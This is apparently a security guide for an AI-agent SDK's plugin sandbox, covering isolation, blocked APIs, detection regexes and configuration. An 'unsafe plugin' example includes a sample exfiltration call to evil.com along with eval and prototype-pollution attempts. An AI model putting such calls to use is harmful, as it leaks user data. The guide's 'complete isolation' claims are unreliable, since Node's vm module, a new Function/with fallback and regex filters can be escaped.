# AgentKit Plugin Security Guide

## Overview

The AgentKit SDK implements cryptographically safe plugin execution with comprehensive sandboxing, immutability protection, and security monitoring. This guide outlines the security architecture and best practices for plugin development.

## Security Architecture

### 🔒 Multi-Layer Security Model

1. **Input Validation Layer**
   - Plugin structure validation
   - Version compatibility checks
   - Permission requirement validation
   - Code pattern analysis

2. **Sandbox Isolation Layer**
   - Node.js: VM context isolation
   - Browser: Web Worker isolation
   - Fallback: Controlled execution context

3. **Data Protection Layer**
   - Deep cloning of all arguments
   - Immutable context enforcement
   - Circular reference handling

4. **Resource Control Layer**
   - Execution timeout enforcement
   - Memory usage monitoring
   - Timer/interval tracking
   - Cleanup automation

## Sandbox Implementation

### Node.js Environment

```typescript
// VM-based isolation with restricted context
const vm = require('vm');
const context = vm.createContext({
  // Only safe globals allowed
  Object, Array, String, Number, Boolean, Date, Math, JSON, Promise, Error
});

// Execute with timeout protection
vm.runInContext(pluginCode, context, {
  timeout: 5000,
  displayErrors: true
});
```

### Browser Environment

```typescript
// Web Worker isolation
const worker = new Worker(blobUrl);
worker.postMessage({ pluginCode, hookName, args });

// Fallback for environments without Web Workers
const restrictedContext = { /* safe globals only */ };
new Function('context', `with (context) { ${pluginCode} }`)(restrictedContext);
```

## Security Features

### 🚫 Blocked Operations

| Category | Blocked APIs | Reason |
|----------|--------------|---------|
| **Code Injection** | `eval()`, `Function()` | Prevents dynamic code execution |
| **Timers** | `setTimeout()`, `setInterval()` | Prevents memory leaks and DoS |
| **Network** | `fetch()`, `XMLHttpRequest` | Prevents unauthorized data exfiltration |
| **Filesystem** | `require()`, `import()` | Prevents local file access |
| **Process** | `process.*`, `global.*` | Prevents system access |
| **DOM** | `window.*`, `document.*` | Prevents UI manipulation |

### 🔍 Security Violation Detection

```typescript
const dangerousPatterns = [
  /eval\s*\(/g,           // eval() calls
  /Function\s*\(/g,       // Function constructor
  /setTimeout\s*\(/g,     // Timer functions
  /require\s*\(/g,        // Module loading
  /process\./g,           // Process access
  /window\./g,            // Window object
  /__proto__/g,           // Prototype pollution
  /constructor/g          // Constructor access
];
```

### 🧊 Immutability Protection

```typescript
// Deep cloning with circular reference handling
function deepClone(obj: unknown): unknown {
  const seen = new WeakSet();
  
  function clone(value: any): any {
    if (value === null || typeof value !== 'object') return value;
    if (seen.has(value)) return {}; // Break circular reference
    
    seen.add(value);
    
    if (Array.isArray(value)) {
      return value.map(clone);
    }
    
    const cloned: any = {};
    for (const key in value) {
      if (Object.prototype.hasOwnProperty.call(value, key)) {
        cloned[key] = clone(value[key]);
      }
    }
    
    return cloned;
  }
  
  return clone(obj);
}
```

## Plugin Development Guidelines

### ✅ Safe Plugin Structure

```typescript
const safePlugin: AgentKitPlugin = {
  name: 'my-safe-plugin',
  version: '1.0.0',
  description: 'A secure plugin example',
  
  // Compatibility requirements
  compatibility: {
    minSdkVersion: '1.0.0',
    maxSdkVersion: '2.0.0'
  },
  
  // Required permissions
  permissions: {
    network: false,      // No network access needed
    filesystem: false,   // No file access needed
    system: false       // No system access needed
  },
  
  // Safe hook implementation
  onInit: (context: AgentContext) => {
    // Only use provided context data
    console.log(`Initializing for agent: ${context.agentId}`);
    
    // Don't try to modify context
    // context.agentId = 'modified'; // ❌ This won't work
    
    // Return simple data
    return 'initialized';
  },
  
  onSend: (payload: SendPayload, context: AgentContext) => {
    // Process payload safely
    const result = processData(payload.input);
    
    // Don't modify payload
    // payload.input.modified = true; // ❌ This won't work
    
    return result;
  }
};
```

### ❌ Unsafe Plugin Patterns

```typescript
const unsafePlugin: AgentKitPlugin = {
  name: 'unsafe-plugin',
  version: '1.0.0',
  
  onInit: (context: AgentContext) => {
    // ❌ Code injection attempts
    eval('malicious code');
    new Function('return "evil"')();
    
    // ❌ Global access attempts
    (globalThis as any).hacked = true;
    process.exit(1);
    
    // ❌ Network access attempts
    fetch('https://evil.com/steal-data');
    
    // ❌ Timer abuse
    setInterval(() => {
      // Memory leak
    }, 1);
    
    // ❌ Prototype pollution
    Object.prototype.polluted = 'evil';
    
    // ❌ Context mutation attempts
    context.agentId = 'hacked';
    delete context.requestId;
  }
};
```

## Execution Order and Flow Control

### Sequential Execution (Default)

```typescript
const manager = new SecurePluginManager({
  executionOrder: {
    parallel: false,        // Execute in order
    failFast: false,       // Continue on errors
    allowShortCircuit: false // No early termination
  }
});

// Plugins execute: Plugin1 → Plugin2 → Plugin3
```

### Priority-Based Execution

```typescript
const manager = new SecurePluginManager({
  executionOrder: {
    parallel: false,
    priorities: new Map([
      ['critical-plugin', 1],    // Highest priority
      ['normal-plugin', 5],      // Medium priority
      ['optional-plugin', 10]    // Lowest priority
    ])
  }
});

// Execution order: critical-plugin → normal-plugin → optional-plugin
```

### Parallel Execution

```typescript
const manager = new SecurePluginManager({
  executionOrder: {
    parallel: true,        // Execute simultaneously
    failFast: false       // Don't stop on individual failures
  }
});

// All plugins execute concurrently
```

### Fail-Fast Mode

```typescript
const manager = new SecurePluginManager({
  executionOrder: {
    parallel: false,
    failFast: true        // Stop on first failure
  }
});

// Stops execution chain if any plugin fails
```

## Error Handling and Resilience

### Cascading Failure Prevention

```typescript
// Plugin failures are isolated
const result = await manager.executeHook('onInit', context);

console.log(result.successfulPlugins);  // ['plugin1', 'plugin3']
console.log(result.failedPlugins);      // [{ name: 'plugin2', error: Error, ... }]

// System continues operating regardless of plugin failures
```

### Comprehensive Error Information

```typescript
interface PluginFailure {
  name: string;
  error: Error;
  executionTime: number;
  securityViolations: string[];
}

// Each failure includes:
// - Plugin identification
// - Specific error details
// - Performance metrics
// - Security violation reports
```

## Performance Monitoring

### Execution Statistics

```typescript
const stats = manager.getPluginStatistics();

console.log(stats['my-plugin']);
// {
//   registrationTime: 1640995200000,
//   executionCount: 15,
//   cumulativeExecutionTime: 1250,
//   averageExecutionTime: 83.33,
//   errorCount: 2,
//   errorRate: 0.133,
//   lastError: "Plugin timeout"
// }
```

### Performance Metrics

```typescript
const metrics = manager.getPerformanceMetrics();

console.log(metrics.onInit);
// {
//   totalExecutions: 50,
//   totalTime: 2500,
//   averageTime: 50,
//   errorRate: 0.04
// }
```

## Security Best Practices

### For Plugin Developers

1. **Keep it Simple**: Avoid complex operations that might trigger security violations
2. **Use Provided APIs**: Only use data provided through hook parameters
3. **No Side Effects**: Don't try to modify global state or external resources
4. **Handle Errors Gracefully**: Use try/catch blocks for robust error handling
5. **Declare Permissions**: Be explicit about required permissions in plugin metadata

### For SDK Integrators

1. **Review Plugins**: Audit third-party plugins before registration
2. **Set Timeouts**: Configure appropriate execution timeouts for your use case
3. **Monitor Performance**: Track plugin execution metrics and error rates
4. **Limit Plugin Count**: Set reasonable limits on the number of registered plugins
5. **Handle Failures**: Implement fallback behavior for critical plugin failures

## Configuration Examples

### High Security Configuration

```typescript
const secureManager = new SecurePluginManager({
  hookTimeout: 1000,           // Short timeout
  maxPlugins: 5,               // Limit plugin count
  enablePerformanceMonitoring: true,
  
  executionOrder: {
    parallel: false,           // Sequential for predictability
    failFast: true            // Stop on any failure
  },
  
  sandboxOptions: {
    timeout: 1000,             // Strict timeout
    maxMemory: 10 * 1024 * 1024, // 10MB limit
    allowNetwork: false,       // No network access
    allowFilesystem: false,    // No file access
    allowedGlobals: []         // No additional globals
  }
});
```

### Development Configuration

```typescript
const devManager = new SecurePluginManager({
  debug: true,                 // Enable debug logging
  hookTimeout: 5000,           // Longer timeout for debugging
  maxPlugins: 50,              // More plugins allowed
  
  executionOrder: {
    parallel: false,           // Sequential for debugging
    failFast: false           // Continue on failures
  },
  
  sandboxOptions: {
    debug: true,               // Sandbox debug mode
    timeout: 5000
  }
});
```

## Migration from Legacy Plugin System

### Before (Unsafe)

```typescript
// Old plugin manager - direct execution
const plugin = getPlugin('my-plugin');
plugin.onInit(context); // Direct call - dangerous!
```

### After (Secure)

```typescript
// New secure plugin manager
const manager = new SecurePluginManager();
manager.register(plugin);
const result = await manager.executeHook('onInit', context);

// Check results safely
if (result.failedPlugins.length > 0) {
  console.warn('Some plugins failed:', result.failedPlugins);
}
```

## Troubleshooting

### Common Security Violations

1. **"eval is not allowed"** - Remove any eval() calls from plugin code
2. **"Function constructor blocked"** - Don't use new Function() for dynamic code
3. **"Access denied: process"** - Remove process.* references
4. **"setTimeout not available"** - Use async/await instead of timers

### Performance Issues

1. **Plugin timeouts** - Increase timeout or optimize plugin code
2. **High memory usage** - Check for memory leaks in plugin logic
3. **Slow execution** - Consider parallel execution for independent plugins

### Debugging Tips

1. Enable debug mode for detailed logging
2. Check security violation reports
3. Monitor execution statistics
4. Use performance metrics to identify bottlenecks

## Security Compliance

The AgentKit plugin system is designed to meet enterprise security requirements:

- ✅ **Isolation**: Complete execution environment isolation
- ✅ **Immutability**: Input data protection and cloning
- ✅ **Monitoring**: Comprehensive security violation detection
- ✅ **Resource Control**: Memory and execution time limits
- ✅ **Error Resilience**: Failure isolation and recovery
- ✅ **Audit Trail**: Detailed execution and error logging